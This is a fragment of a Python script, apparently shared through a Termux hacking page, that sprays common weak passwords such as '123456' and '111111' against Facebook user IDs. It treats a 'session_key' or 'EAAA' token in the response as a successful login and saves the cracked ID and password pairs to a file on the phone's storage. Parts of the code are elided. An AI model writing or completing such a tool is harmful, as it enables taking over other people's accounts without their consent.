#========= SC SEND BY > Termux Tx Cmd
#==========FACEBOOK PAGE : Termux Tx Cmd
import random
import requests
import sys
import time
...
sys.stdout.write('\x1b]2; 𓆩🀪💚【 Termux SC SEND Termux Tx Cmd \x07')
    ...
    try:
        ...
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            ...
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/Termux_old.txt', 'a') as file:
                    file.write(f'[Termux-OK🌺] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [Termux-OK🌺] {uid} | {pw} | {creationyear(uid)}')
